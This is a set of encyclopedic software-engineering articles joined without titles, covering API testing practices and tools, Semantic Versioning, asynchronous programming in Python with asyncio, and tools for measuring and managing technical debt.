But sometimes we may want to validate if an API request triggers another API request or updates the database .
For example , an API request may trigger a request to the Google Maps API .
During testing , we could mock Google Maps API and validate the request made to the mocked API .
What are the possible benefits of API testing ?
Since data is exchanged in standard formats ( XML , JSON ) , API testing is language agnostic .
Any programming language can be used to create API tests .
API responses can be easily validated since most languages have libraries to compare data in these formats .
End - to - end testing ca n't be done unless all parts of the application are ready .
With API testing , business logic can be tested early on even when the GUI is still under development .
This also facilitates easier end - to - end testing at a later stage .
Because APIs are usually well specified , API testing leads to high test coverage .
Moreover , the UI changes often during development .
API tests based on well - defined specifications are easier to maintain .
API testing is faster than UI testing .
More tests can be performed in a shorter time .
Releases can happen faster .
When an API test fails , it 's easier to find the source of failure .
API testing also enables automation of CI / CD pipelines .
What types of tests are possible at the API layer ?
API testing during integration of multiple APIs .
Source : SmartBear 2020 .
A wide variety of tests can be done at the API layer , both functional and non - functional : Validation and functional tests ensure that APIs behave as desired and deliver specific functionalities .
Security and penetration tests would consider user authentication or authorization , threat detection , and data encryption .
Load testing checks app performance at normal and peak loading conditions , or if throttling is correctly applied at theoretical maximum load .
For example , we may want to know how many API requests can be served per minute with a specific response time .
Tests can be designed to check for runtime errors , resource leaks and general monitoring of the app .
Fuzz tests include random data in API requests .
The app is expected to be robust against such requests .
UI events and interactions trigger API calls .
Thus , UI testing is also an approach to API testing .
Since APIs interface various services , they play a key role in integration testing .
However , they 're also useful in end - to - end testing to validate dataflows across services .
What are some best practices for API testing ?
API testing process .
Source : Terefe 2017 .
Before creating API tests , document and understand the API .
This should include API purpose , application workflows , supported integrations , and so on .
Some tools for API testing include ReadyAPI , AcceIQ , Katalon , SoapUI , Postman , Apigee , JMeter , REST - assured , and more .
Manual API testing could be a starting point .
Tools such as Postman can help create tests manually , save them , and replay them later .
For automated API testing , adopt an automation framework such as Robot Framework .
Create client code and components that can be reused across many tests .
Write clear tests so that debugging and maintenance is easier .
Organize each test into three parts : setup , execution and teardown .
It should be possible to configure tests for different environments or customer requirements .
Write tests in a modular fashion .
For example , user authentication and password change can be two separate tests , and the latter can be made dependent on the former .
Measure how long each test takes .
This can help in scheduling tests .
Schedule tests to execute every day .
When a test fails , make the failure state explicit in the response or report .
The test systems should record failures for later analysis .
While APIs existed in earlier decades , the early 2000s marked the birth of modern APIs .
During this time , companies such as Salesforce , eBay and Amazon popularized the use of APIs .
In these APIs , the use of the XML data format has become common .
Cohn 's test automation pyramid .
Source : Vocke 2018 , fig .
2 .
Mike Cohn makes the point that test automation must be done at the correct level .
He identifies three levels : unit , service and UI .
He visualizes these into a test automation pyramid .
We wish to do lots of unit testing and as little UI testing as possible .
API testing happens in between and avoids unnecessary repetitions of the same UI actions .
Although he calls the middle layer the service layer , it 's not restricted to just service - oriented architecture ( SOA ) .
Since API specifications are formal , and with the recent progress of Natural Language Processing ( NLP ) , some tools such as Functionize explore the possibility of automatically generating API tests from the specifications .
This takes test automation to another level , so that human testers can focus on exploratory and security tests .
A selection of API testing tools from 2020 .
Source : Aldaine 2018 .
As organizations move towards DevOps , Continuous Integration ( CI ) and Continuous Delivery / Deployment ( CD ) , there 's a need to have quicker feedback from testing .
End - to - end or UI testing is slow .
API testing is one solution , but it must be easy to create , execute and maintain API tests .
It needs to be automated as much as possible .
To enable this , many tools are available on the market .
There are both open - source and commercial API testing tools .
We ca n't say which of these is the best .
We should select a tool that best suits our project .
The selection should be based on features and how well it integrates with other tools and our processes .
Since 2018 , some tools have begun to adopt AI / ML .
This could become an essential feature in the years to come .
What should I look for when selecting an API testing tool ?
Cost vs feature comparison of API testing tools .
Source : Aldaine 2018 .
At the minimum , any tool should make API requests and validate responses .
Other features to consider are : easy to install , learn and customize ; good documentation ; available on multiple platforms / devices ; supports multiple protocols ( REST , SOAP , HTTP , JMS , TCP / IP ) ; integrates with CI / CD pipelines ; can sniff exploratory tests to automatically create API tests ; tests but also validates API specifications .
The syntax for writing tests must be simple enough for those with little coding experience .
Pick a tool that integrates with your automation framework .
For example , REST - assured integrates seamlessly with Serenity .
For teams , the tool should enable collaboration .
It should be possible to share test cases and results , or publish tests and allow others to run them easily .
Some tools , such as SoapUI are dedicated to API testing .
Others , such as JMeter , were designed for load testing but support API testing .
The swagger is meant for designing APIs but can also be used for testing .
This is worth considering if you 're looking for a single unified tool .
What are the types of API testing tools ?
Broadly , we can identify the following types : Command - Line : cURL is an example that can query an API and print out the response .
It uses libcurl that can be used in any client - side program .
Thus , developers can create their own CLI - based API testing tool using libcurl .
Dredd is another CLI tool .
On Windows , PowerShell is a good choice .
Browser - Based : DHC and Postman are examples that can run within a browser .
Compared to CLI tools , they offer a user - friendly interface for testers .
Postman was initially delivered as a Chrome App , then a standalone desktop app , and then a web app since September 2020 .
Standalone IDE : Katalon Studio is an example that supports test case generation , CI / CD integration , and many types of testing ( API , Web , Mobile , Desktop ) .
Karate is an example that can be installed as a plugin / extension and used within IDEs / editors such as IntelliJ or Visual Studio Code .
It supports API testing , mocks , performance testing and UI automation .
Could you describe some API testing tools ?
Comparing some API testing tools .
Source : Software Testing Help 2020 .
Katalon Studio claims to be an " all - in - one test automation solution " .
It offers free and enterprise versions .
The free version supports basic record and playback , REST and SOAP , OAuth for authentication , different types of testing ( keyword - driven , data - driven , BDD ) , parallel execution , and headless execution .
It can also import tests from other tools / frameworks such as Selenium , Postman , JUnit , TestNG , SoapUI and Swagger .
In Postman , tests can be organized into collections that can be shared with others .
API design and maintenance can be done within Postman , which serves as the single source of truth .
Multiple APIs can be version controlled and tagged .
Mock servers and environments can be created .
It can monitor API uptime and responsiveness .
Newman is Postman 's CLI tool for easy integration into CI / CD pipelines .
An alternative to Postman is Hoppscotch ( previously called Postwoman ) .
It runs within the browser and supports GraphQL .
As is common , requests can be customized with authentication , headers , and pre - request script .
The Assertions are in JavaScript .
OpenAPI.Tools has a list of API testing tools , briefly describing each of them .
What 's the syntax that tools use for specifying API tests ?
Gherkin syntax is supported by Karate .
Source : Intuit GitHub 2020 .
Karate uses Gherkin syntax that was popularized by Cucumber for BDD .
REST - assured also supports BDD syntax .
Taurus allows tests to be written in YAML or JSON .
Parasoft SOAtest uses visual drag - and - drop .
The Drag - and - drop method of creating tests is also supported by SoapUI .
In addition , SoapUI supports the Groovy language , which has a concise and expressive syntax for the Java platform .
ACCELQ is a cloud - based application for which no code needs to be written .
Which are the API testing tools in various languages ?
Some tools support many languages .
Postman has code generators in many languages that developers can use .
RedwoodHQ is another tool that has support for Java / Groovy , Python and C # .
Fiddler supports .NET , Java and Ruby .
API testing in the Java domain has been traditionally hard .
REST - assured simplifies this with support for XML or JSON format in requests and responses .
In Ruby , airborne is an option .
It relies on RSpec .
It works with APIs written in Ruby on Rails .
WebInject is a tool written in Perl and therefore requires a Perl interpreter at runtime .
In JavaScript , Chakram is a tool based on Node.js , Chai.js and Mocha .
It uses BDD syntax .
Another tool in JavaScript is Frisby that uses Node.js and Jasmine .
In Python , Pyresttest is applicable .
It 's also a micro - benchmarking tool .
Configuration is in JSON or YAML .
Hence , a little coding knowledge is needed .
How is artificial intelligence enabling API testing tools ?
AI / ML helps in the automatic generation of API tests .
Source : Colosimo 2018a .
Test engineers have always found UI testing to be easier than API testing .
They may not know how all the software components work together via their APIs .
API testing requires a better understanding of the software .
AI / ML is attempting to remove some of this complexity .
One approach is to simply monitor UI tests , discover patterns and then use this knowledge to automatically create API tests .
One tool that generates API tests is Parasoft SOAtest Smart API Test Generator .
It 's installed as an add - on to a web browser .
For example , on an e - commerce site , it would learn that a cart ID is important in API calls .
A human could indicate that the number of items in the shopping cart is important .
AI would learn this and validate this in future API calls .
Other AI / ML testing tools include Applitools , Testim , Sealights , Test .
AI , MABL , Retest , and ReportPortal .
AI / ML can catch UI changes and identify them as bugs or features ; analyze code changes and execute relevant tests ; detect code changes and automatically update existing tests ; automate result analysis and defect management .
Evolution of test automation .
Source : Brown 2018 .
It 's in this decade that APIs started getting popular , partly due to Salesforce , eBay and Amazon .
Due to Agile practices , there 's also a need to automate API testing .
In this decade , focus has shifted to scalability .
Adoption of DevOps and CI / CD make it necessary to embrace automated API testing .
However , even by the end of the decade , many organizations continue with UI testing .
Parasoft SOAtest 9.10.6 has been released .
This includes AI / ML capability that 's now part of its Smart API Test Generator .
In general , 2018 is the year when tools start , including AI / ML .
Focus shifts from just test automation to including test generation .
Software is almost always versioned to coordinate installation , upgrades and correct interfacing with other software .
While a flat linear number such as 123 , 124 , 125 … might do the job , Semantic Versioning ( SemVer ) presents a better numbering scheme .
It contains more useful information .
Each part of the version number has a well - defined meaning .
This helps software professionals and automation tools to more easily update software versions for their applications .
Traditionally , every software vendor designed their own numbering scheme , sometimes with semantics .
From the late 1990s , software became more open - sourced .
As applications are increasingly built from many open source components , it has become essential to know and use the correct version of each component .
SemVer provides a common definition .
Without a proper versioning scheme , it becomes difficult to update software and its dependencies , leading to what 's often called dependency hell .
Could you describe the main parts of a semantic version number ?
Basic syntax of semantic version .
Source : Rana 2019 .
A semantic version number has three core parts , written in the form of ` x.y.z ` , where ` x ` , ` y ` and ` z ` are numbers : Major : Incremented when incompatible API changes are made .
Applications and other software that use the affected APIs will break .
Hence , their code has to be updated .
Minor : Incremented when new functionality is added in a backward compatible manner .
It 's safe to update to a new minor version without requiring code changes .
Code changes are needed only to make use of the new features .
Patch : Incremented when backward compatible bug fixes are made .
No new features are added .
Some call this micro .
As an example , consider the base version number ` 1.0.0 ` .
A bug fix to an internal implementation is a patch , resulting in ` 1.0.1 ` .
Suppose a new argument with a default value is added to a public method , and the default value is consistent with the base version .
This is a minor update , resulting in ` 1.1.0 ` .
If the new argument has no default value , this is an incompatible API change , resulting in ` 2.0.0 ` .
Could you describe the SemVer parts of pre - release and build ?
Parts of a semantic version number .
Source : Devopedia 2020 .
Sometimes we wish to release software informally to some users for testing purposes .
These are called pre - releases .
In SemVer , this is specified by a hyphen followed by one or more dot - separated pre - release identifiers .
Identifiers can include hyphens and alphanumeric characters .
For example , in ` 1.2.4-alpha.1 ` , ` -alpha.1 ` is a pre - release part that has two pre - release identifiers .
In pre - release , software may not be stable and might not satisfy the compatibility requirements implied by the normal version ` 1.2.4 ` .
Sometimes we wish to record building metadata such as who made the built , building machine , time of building , or checksum .
In SemVer , this is specified by a plus sign followed by one or more dot - separated build identifiers .
Identifiers can include hyphens and alphanumeric characters .
For example , in ` 1.0.0-beta+exp.sha.5114f85 ` , ` + exp.sha.5114f85 ` is the build part that has three build identifiers .
` 1.0.0 + 20130313144700 ` is an example with build information but not a pre - release .
Both pre - release and build parts are optional .
The pre - release part comes before the build part .
What 's the precedence of version numbers in SemVer ?
SemVer ranges specify allowed versions of each dependency .
Source : Van de Moere 2013 .
When upgrading from a lower to a higher version , it 's important to define how version numbers should be compared .
The comparison is left to right .
Thus , ` 1.0.0 < 2.0.0 < 2.1.0 < 2.1.1 ` .
Two versions that differ only by the build part , have the same precedence .
A pre - release version has lower precedence than its normal version .
Numeric identifiers always have lower precedence than non - numeric identifiers .
Thus , ` 1.0.0-alpha < 1.0.0-alpha.1 < 1.0.0-beta.2 < 1.0.0-beta.11 < 1.0.0-rc.1 < 1.0.0 ` .
Precedence is used when updating project dependencies via SemVer ranges .
For example , in NPM projects , the dependency version can be specified as : ` 1.0 ` or ` 1.0.x ` to allow all patches to ` 1.0 ` ; ` ~1.0.4 ` to allow patches to ` 1.0.4 ` ` 1 ` or ` 1.x ` to allow all patches and minor updates to ` 1 ` ; ` ^1.0.4 ` to allow patches and minor updates to ` 1.0.4 ` ` * ` or ` x ` to allow any update What are the benefits of using semantic versioning ?
NPM uses SemVer to streamline package updates .
Source : NPM Inc 2014 .
When an application uses and depends on many software packages , SemVer helps with using the most suitable versions of these packages .
Suppose a Node.js application currently uses ` 2.0.0 ` of a certain package .
Suppose more recent versions ` 2.1.0 ` and ` 3.0.0 ` are available .
By specifying ` ^2.0.0 ` in the configuration file , the NPM package manager will update the package to ` 2.1.0 ` but not ` 3.0.0 ` , thereby preserving backward compatibility .
By using semantic version ranges , such as ` ^2.0.0 ` , ` < 3.0.0 ` or ` ~2.2.1 ` , the application benefits from package updates without any update to the configuration file .
Package developers can use SemVer to keep track of how the package has evolved and manage its lifecycle .
Semantic versioning helps them to know what releases are compatible with others .
SemVer also avoids dependency hell , which can happen when different versions of the same package are used by other packages in the same application .
Which are some well - known projects or communities using semantic version ?
NuGet package version , associated tasks and branches .
Source : Varga 2015 .
We note a few projects as examples .
Node.js uses SemVer .
Versioned dependencies are specified in a configuration file , such as ` bower.json ` ( for Bower ) or ` package.json ` ( for NPM ) .
NPM also has a useful SemVer calculator .
Python uses SemVer but it allows for a more flexible use beyond the SemVer specification .
For example , Python PEP 440 allows a date - based versioning scheme , such as ` 2012.4 ` or ` 2012.7 ` .
It allows for alpha , beta and release candidate versions , such as ` 1.3a2 ` , ` 1.3b1 ` , and ` 1.3rc4 ` .
Post - releases are allowed , such as ` 1.3post2 ` or ` 1.3rc4.post2 ` .
Development releases are allowed , such as ` 1.3dev2 ` .
The public version identifier is separated from the local version identifier with a plus sign , such as ` 1.0+ubuntu.1 ` .
The composer , a PHP dependency manager , adopts SemVer .
It includes stability constraints such as ` -dev ` or ` -stable .
` .
Versioned dependencies are specified in the file ` composer.json ` .
Could you mention some best practices when using semantic version ?
The version core is formed of digits 0 - 9 but must not contain leading zeros .
Thus , ` 2.1.0 ` is fine but ` 2.01.0 ` is not .
Version ` 0.x.y ` can be used during initial development with an unstable public API .
This can start with ` 0.1.0 ` .
Once software enters production , it should start with ` 1.0.0 ` .
Sometimes we see a prefix ` v ` , such as in ` v2.1.3 ` .
This is often seen as tag names in version control systems .
This is acceptable , although the version number is just ` 2.1.3 ` .
Package owners / developers must attempt to avoid frequent incompatible changes .
The cost of major upgrades is significant .
It 's important to evaluate the cost / benefit ratio before introducing incompatible changes .
Some even recommend creating a new library / package name rather than making incompatible changes to an existing one .
If an incompatible change goes into a minor version by mistake , release a new minor version to restore compatibility .
The incompatible changes can go into the next major release .
Avoid modifying an existing release .
Deprecating a public API should happen in at least one minor release before that API is removed in a subsequent major release .
What are some criticisms of the semantic version ?
While the specifications are clear , putting them into practice is more difficult .
It 's not always clear if something is a bug fix or a new feature .
For example , there 's no consensus about the next version number if a new warning is added to a package .
There 's no fully automated way of knowing if a change is compatible .
Code reviews , golden files and automated tests can address this .
For example , a Java API package has two types of users : consumers who use the API and providers who implement the API .
An API change can be compatible for some users and incompatible for others .
Spring Boot uses version numbers to indicate the extent of change .
Adopting SemVer would lead to too many major releases .
SemVer is rigid in the sense that a minor change that " breaks " for 1 % of users will still be considered as a major change .
This may be okay for robots , but not for humans .
Version numbers must give us a sense of how much of the code has changed .
Ultimately , SemVer is not going to protect us completely from breaking changes .
We should instead take some time and responsibly update dependencies .
Oracle releases version 2.3 of its SQL - based RDBMS .
This is just an example to show that some form of semantics is part of version numbers even in the 1970s or possibly earlier .
Subsequently , Oracle evolves this number to the form ` major.maintenance.applicationserver.component.platform ` .
Linux kernel version numbering system .
Source : Love 2010 , fig .
1.2 .
Linux kernel version 1.0.0 has been released .
Subsequently , this project adopts a numbering system of the form ` major.minor.revision.stable ` .
In later years , ` major.minor ` together represent a major stable release .
Revisions to this include bug fixes , new drivers and even features .
The optional ` stable ` part indicates stable ( even numbers ) or development ( odd numbers ) releases .
Sometimes ` major ` is incremented if ` minor ` " gets too large " .
OSGi Alliance publishes a whitepaper titled Semantic Versioning .
This versioning scheme is targeted at Java packages .
A version number has four parts in this form : ` major.minor.patch.qualifier ` .
Examples of these are ` 0.9.0 ` , ` 1.11.2.20100202-R32 ` , and ` 2.0.0.beta-20100202-R32 ` .
We should note that this is not exactly the same as the SemVer specifications that came out in 2011 .
Tom Preston - Werner publishes on GitHub version 1.0.0-beta of Semantic Versioning Specification .
Version 1.0.0 appears in September .
Version 2.0.0 of Semantic Versioning Specification is published .
Drupal 8.0.0 has been released .
Starting with this version , Drupal adopts the semantic version .
In earlier versions , for example , a contributed module of version 1.0.0 might refer to 8.x-1.0 or 7.x-1.0 depending on the Drupal core version .
The project 's ` info.yml ` file resolved the ambiguity .
Adopting the semantic version simplifies this .
Drupal is a PHP - based CMS .
Its first version was open source in 2001 .
Asynchronous programming is a programming paradigm that enables better concurrency , that is , multiple threads running concurrently .
In Python , the ` asyncio ` module provides this capability .
Multiple tasks can run concurrently on a single thread , which is scheduled on a single CPU core .
Although Python supports multithreading , concurrency is limited by the Global Interpreter Lock ( GIL ) .
The GIL ensured that only one thread can acquire the lock at a time .
Asynchronous programming does n't solve the GIL limitation but still enables better concurrency .
With multiprocessing , task scheduling is done by the operating system .
With multithreading , the Python interpreter does the scheduling .
In Python 's asynchronous programming , scheduling is done by what 's called the event loop .
Developers can specify in their code when a task voluntarily gives up the CPU so that the event loop can schedule another task .
For this reason , this is also called cooperative multitasking .
What 's the background for adopting asynchronous programming in Python ?
Different techniques of concurrency in Python .
Source : Adapted from Anderson 2019 .
Python has long supported both multiprocessing and multithreading .
Multiprocessing can make use of multiple CPU cores but at the overhead cost of inter - process communication ( IPC ) .
Each process has its own Python interpreter and GIL .
Multithreading avoids the IPC overhead by having all threads share the same memory space .
But the scheduling of these threads is limited by the GIL .
For I / O - bound threads , if a thread waits on I / O , GIL is automatically released and given to another thread .
For CPU - bound threads , GIL does n't give us a mechanism to run all threads concurrently , even if the system has multiple CPU cores .
In either case , asynchronous programming helps us achieve better concurrency ( for the single CPU core scenario ) .
GIL is used in Python 's default CPython implementation .
CPython 's use of GIL makes memory management thread safe .
Other implementations such as JPython and IronPython are not limited by the GIL .
They solve memory management and thread synchronization within their virtual machines ( JVM / CLR ) .
Historically , CPython 's GIL made it easy to interface with C extensions in a thread - safe manner , which made Python popular .
Which are the basic constructs that enable asynchronous programming in Python ?
Python 's async / await syntax .
Source : Kennedy 2019 , 39:00 .
Executing asynchronous code requires an event loop .
Python provides a default event loop implementation .
It 's also possible to use alternative implementations such as ` uvloop ` , which has shown at least 2x better performance .
The event loop executes coroutines , one at a time .
A coroutine is simply a method or function defined with ` async ` keyword .
A coroutine needs to be added to the event loop , such as using ` asyncio.run ( ) ` .
When a coroutine waits for the result of another coroutine using the ` await ` keyword , it gets suspended .
The event loop then schedules another coroutine that 's ready to run .
More formally , a custom waits for an awaitable object .
This can be another routine , a task or a future .
A Task is really a wrapper for a coroutine typically created with ` asyncio.create_task ( ) ` .
Via the Task , the coroutine is automatically scheduled .
A Future is a low - level object that represents the eventual result of an asynchronous operation .
When a future is awaited , it means the routine will wait until the future is resolved in some other place .
Which are some basic API calls worth knowing for a beginner ?
We can create multiple event loops in a thread but only one can be active at a time .
Relevant APIs to learn are ` asyncio.new_event_loop ( ) ` , ` asyncio.set_event_loop ( ) ` , ` asyncio.get_event_loop ( ) ` and ` asyncio.get_running_loop ( ) ` .
If ` asyncio.get_event_loop ( ) ` is called without a prior call to ` asyncio.set_event_loop ( ) ` , a new event loop is automatically created and set as the current one .
Event loop methods include ` run_until_complete ( ) ` , ` run_forever ( ) ` , ` is_running ( ) ` , ` is_closed ( ) ` , ` stop ( ) ` and ` close ( ) ` .
Callbacks can be scheduled with ` call_soon ( ) ` , ` call_soon_theadsafe ( ) ` , ` call_later ( ) ` and ` call_at ( ) ` .
Another useful method of loop is ` create_task ( ) ` , which is also possible with ` asyncio.create_task ( ) ` .
Loop also includes methods to manage network connections and entities : ` create_connection ( ) ` , ` create_datagram_endpoint ( ) ` , ` create_server ( ) ` , ` sendfile ( ) ` , ` start_tls ( ) ` , plus low - level methods to work directly with sockets .
` asyncio.run ( ) ` runs a coroutine , in the process creating an event loop and closing it at the end .
This ca n't be called if an event loop is already running in the current thread .
To run many tasks concurrently , call ` asyncio.gather ( ) ` .
Other useful methods include ` asyncio.wait ( ) ` , ` asyncio.wait_for ( ) ` , ` asyncio.current_task ( ) ` and ` asyncio.all_tasks ( ) ` .
To sleep asynchronously , use ` asyncio.sleep ( ) ` rather than ` time.sleep ( ) ` .
What are some essential tips when working with asynchronous Python code ?
An event loop can run on any thread but it must run on the main thread if it has to handle signals and execute subprocesses .
To schedule callbacks from another thread , use ` loop.call_soon_threadsafe ( ) ` rather than ` loop.call_soon ( ) ` .
Note that calling a coroutine function does n't actually execute the function and return the result .
It only returns a coroutine object , which must be passed into ` asyncio.run ( ) ` .
Avoid CPU - bound blocking calls .
For example , if a CPU - intensive computation takes 1 second , all asynchronous tasks and I / O operations will be delayed by 1 second .
Use ` loop.run_in_executor ( ) ` along with ` concurrent.futures .
ThreadPoolExecutor ` to execute blocking code on a different thread or even a different process .
Which Python packages or modules enable asynchronous programming ?
Asynchronous programming techniques in Python .
Source : Kennedy 2019 , 12:40 .
Module ` asyncio ` is the main one for asynchronous programming in Python .
While ` gevent ` and ` eventlet ` achieve similar behaviour , ` asyncio ` is easier and more approachable even for non - experts .
Use module ` threading ` for I / O - bound concurrent operations .
Use ` multiprocessing ` for CPU - bound parallel computations .
Equivalently , ` concurrent.futures .
ThreadPoolExecutor ` and ` concurrent.futures .
ProcessPoolExecutor ` can be used as it provides a simpler API .
Among the alternatives to ` asyncio ` are ` curio ` and ` trio ` .
Both these are somewhat compatible with ` asyncio ` .
The Trio , in particular , claims to focus on usability and correctness .
Timo Furrer curates a list of asynchronous Python frameworks and packages .
Among the web frameworks are aiohttp , Tornado , Sanic , Vibora , Quart and FastAPI .
For message queues , we have aioamqp , pyzmq , and aiokafka .
For testing , we have aiomock , asynctest , and pytest - asyncio .
For databases we have asyncpg , aioredis , and aiomysql .
The popular ` requests ` library with asynchronous support is called ` requests - async ` .
To make use of multicores or even multiple machines , Apache Spark ( via PySpark ) should be considered .
Meanwhile , work is going on to bring multicore support within the interpreter via projects Software Transactional Memory , Dask and PyParallel .
How can I debug asynchronous Python code ?
By default , ` asyncio ` runs in production mode .
There are many ways to run it in debug mode : Set ` PYTHONASYNCIODEBUG ` environment variable to 1 Use ` -X dev ` command line option use argument ` debug = True ` to ` asyncio.run ( ) ` ( default is ` debug = False ` ) Call ` loop.set_debug(True ) ` ( can inspect current value with ` loop.get_debug ( ) ` ) Adjust the logging level by calling for example ` logging.getLogger("asyncio").setLevel(logging .
WARNING ) ` .
A Python interpreter will emit log messages for never - awaited coroutines or never - retrieved exceptions .
In debug mode , we get more information about these issues .
The third - party library aiodebug might help in debugging asyncio programs .
How 's the performance of asynchronous programming in Python ?
HTTP throughput performance of asyncio , uvloop and httptools .
Source : Selivanov 2016 .
The performance of ` asyncio ` falls short of what Node.js and Go can achieve .
However , when ` asyncio ` is used along with ` uvloop ` ( for the event loop ) and ` httptools ` ( for HTTP ) , it gives the best performance in terms of both throughput and response time .
While ` aiohttp ` offers asynchronous HTTP , it has a slow HTTP parser .
This limitation is addressed by ` httptools ` .
However , in one experiment , ` aiotools ` outperformed its synchronous equivalents such as Flask or Django .
It was 26x faster than Flask .
In another experiment involving multiple HTTP calls , the total runtime was 13.1 secs ( synchronous , 1 thread ) , 1.7 secs ( synchronous , 20 threads ) , and 1.3 secs ( aiohttp , 1 thread ) .
When used with Gunicorn web server , ` aiohttp ` was 2x faster than Flask when a single Gunicorn worker was used .
Another experiment noted that it 's unfair to compare synchronous and asynchronous web frameworks without adjusting the number of workers .
Synchronous frameworks must be given more workers since the entire worker blocks on I / O. With more workers , they can utilize all the CPU cores .
This experiment showed that synchronous frameworks are better .
The first version of Twisted has been released .
At a time when the Python standard does n't offer asynchronous support out of the box , Twisted supports it .
It 's a Python - based event - driven framework useful for building networked clients and servers .
It supports multiple protocols and interfaces .
Ryan Dahl and others at Joyent develop Node.js .
Asynchronous programming is at the heart of Node.js .
With subsequent widespread adoption of Node.js , it has become important for Python to start looking into asynchronous programming .
What Node.js calls promises , Python calls them awaitables .
Work towards standardizing asynchronous support in Python begins as part of PEP 3156 , titled Asynchronous IO Support Rebooted : the " asyncio " Module .
This supersedes an earlier proposal ( PEP 3153 ) .
It also acknowledges earlier work of Twisted , Tornado , and ZeroMQ that have supported asynchronous calls in their packages .
Version 0.1.1 of ` asyncio ` has been released on PyPI .
Version 0.4.1 comes out in April 2014 .
Python 3.4 is released .
Module ` asyncio ` is formally introduced as part of this release .
Python 3.5 is released with support for awaitable objects , coroutine functions , asynchronous iteration , and asynchronous context managers .
This includes syntaxes ` async def ` , ` async for ` , ` async with ` and ` await ` .
Any object that has the ` await ( ) ` method can be awaited .
These changes are expected to make asynchronous programming a lot easier .
The async / await syntax of this release is inspired by ` yield from ` of Python 3.3 and the ` asyncio ` module of Python 3.4 .
Python 3.6 is released .
Asynchronous generators and asynchronous comprehensions are now supported .
The relevant proposals for these are PEP 525 and PEP 530 respectively .
Python 3.7 has been released in which ` async ` and ` await ` are now keywords .
This release improves the ` asyncio ` module in terms of usability and performance .
For example , assuming ` main ( ) ` is our coroutine , scheduling a coroutine to the event loop is as simple as calling ` asyncio.run(main ( ) ) ` .
This simplifies the earlier syntax of ` loop = asyncio.get_event_loop ( ) ` and ` loop.run_until_complete(main ( ) ) ` .
Python 3.8 has been released with asynchronous support for unit testing .
Specifically , ` AsyncMock ` is added along with suitable assert functions .
In the ` unittest ` module , coroutines can be used as test cases for ` unittest .
IsolatedAsyncioTestCase ` .
A visualization from Squore shows software quality .
Source : Vector Informatik 2020 .
In an ideal world , developers follow best practices and implement the best possible solution .
In practice , this is rarely the case .
Technical debt is often accepted to satisfy immediate business needs .
However , this debt must be managed in the long term .
Except for the most trivial projects , it 's difficult to manage technical debt through manual effort .
Fortunately , many tools exist for this purpose .
Engineering systems are diverse because of their choice of hardware , software programming language , development methodology , system architecture , test plans , and so on .
As a result , technical debt is also rich in variety : architecture to code , documentation to testing .
Tools to address them are also varied .
A project might need to adopt more than one tool to manage its technical debt .
What features are expected of tools that manage technical debt ?
Good technical debt management tools are expected to have these traits : Polyglot : Tools needed to analyze the source code .
As such , they must support popular programming languages ( Java , JavaScript , C / C++ , C # , Python , PHP , etc .
) .
This support could be offered as plugins to the main product .
Analysis : Analysis must be from different perspectives , including maintainability , reliability , portability and efficiency .
Approaches can include static code analysis , SCM analysis , and test coverage .
tool should record historical data so that trends can be observed .
The tool should show the time needed to fix the debts .
Reporting : The Dashboard should show a high - level summary and project status .
Dashboards should be customizable since engineers and business folks are interested in different levels of detail .
Visualizations should be clear .
Deployment : The tool can be hosted on - premise or on the cloud .
For multiuser access , there should be a web application .
Flexibility : It should be possible to override default values and configure the tool to suit the project .
For example , thresholds to detect duplicated code must be configurable .
Logging : We may wish to get insights into the analysis or troubleshoot issues .
The tool should therefore collect logs for future study or audit .
Could you mention some tools to manage technical debt ?
Feature support of some technical debt tools .
Source : Pavlič and Hliš 2019 , table 2 .
Some tools only report code metrics , facilitate code reviews or support only a few languages .
Others support multiple languages , cover multiple debt factors , perform risk analysis , visualize debt in different ways , and offer a useful dashboard summary .
Among the latter are SonarQube , Squore , and Kiuwan .
Bliss , SonarQube , Checkstyle , and Closure Compiler are some tools that help with static code analysis .
Designite can detect design smells , such as a class doing things that are not part of its core responsibility ( poor cohesion ) .
Jira Software and Hansoft are examples that identify but do n't measure technical debt .
Jacoco captures test debt .
Among other tools are CAST Application Intelligence Platform , Teamscale , SIG Software Analysis Toolkit , Google CodePro Analytix , Eclipse Metrics , Rational AppScan , CodeXpert , Redmine , Ndepend ( Visual Studio plugin ) , DebtFlag ( Eclipse plugin ) , CLIO , CodeVizard , and FindBugs .
In general , there are more tools for code / test debts than for design / architecture debts .
How do tools quantify technical debt ?
A cost model for calculating technical debt .
Source : Parthiban 2019 , table XXXIV .
Tools should show metrics that are simple , clear , correct and objective .
They should help with decision making .
There are many metrics to quantify debt with respect to design , coding , defects , testing , documentation , and other aspects of product development .
Tools should therefore measure code duplication , code complexity , test coverage , dependency cycles and coupling , lack of documentation , programming rules violations , and more .
Ideally , a few numbers that express overall product quality will be easier to understand at a high level .
Expressing technical debt as in units of person - days points to the effort needed to remove the debt .
This is a good measure , but it does n't indicate product quality .
Therefore , we can also express technical debt as a ratio .
Generally , debt that 's higher than 10 % needs to be addressed quickly .
Tools should also capture trends .
For example , a declining trend in test coverage might suggest that with each iteration the team is adding more features that it 's capable of testing .
In general , effort estimates are hard to get right .
The suggested approach is to remove technical debt gradually ( pay off the principal ) with every release .
What are some approaches that tools use to manage technical debt ?
Conceptual model of technical debt to aid debt quantification .
Source : Nord 2016 .
Given various aspects of managing technical debt , we note the following approaches : Identify : Code analysis , dependency analysis , checklists ; compare against an optimal solution .
Measure : Use mathematical models , source code metrics , manual estimation by experts ; estimate based on debt type ; use operational metrics ; compare against an optimal solution .
Prioritize : Cost - benefit analysis ; repaying items with high remediation costs or interest payments ; select a set of items that maximize returns ( portfolio approach ) .
Monitor : Warn when thresholds are reached ; track debt dependencies ; regular measurements ; monitor with respect to defined quality attributes ; plot and visualize trends .
Document : Record each item in detail with identifier , type , description , principal and interest estimates ; probability of interest payment ; correlation with other items .
Communicate : Summarize on dashboards ; record in a backlog and schedule each development cycle ; list or visualize items .
Prevent : Improve processes ; evaluate potential debts during architecture / design phases ; create a culture that minimizes debt .
Repay : Refactor , rewrite , reengineer ( new features ) ; automate routine tasks ; fix bugs ; improve fault tolerance in areas of debt .
What are some shortcomings of tools that manage technical debt ?
Tools may differ in the way they quantify technical debt .
The calculated metrics may be incomplete or even inaccurate .
For example , a tool may fail to capture architectural debt , such as when code violates layered architecture .
There 's no clear consensus on the dimensions or boundaries of technical debt .
For example , some may consider known defects as technical debt .
When tools report false positives , dealing with these can be tedious .
Many tools calculate the principal ( cost of refactoring ) but not the interest ( extra cost due to technical debt ) .
The latter is more difficult to quantify .
However , it should be noted that the SQALE method has models to estimate both remediation cost ( principal ) and non - remediation cost ( interest ) .
Ward Cunningham coins the term Technical Debt while working on WyCASH+ , a financial software written in Smalltalk .
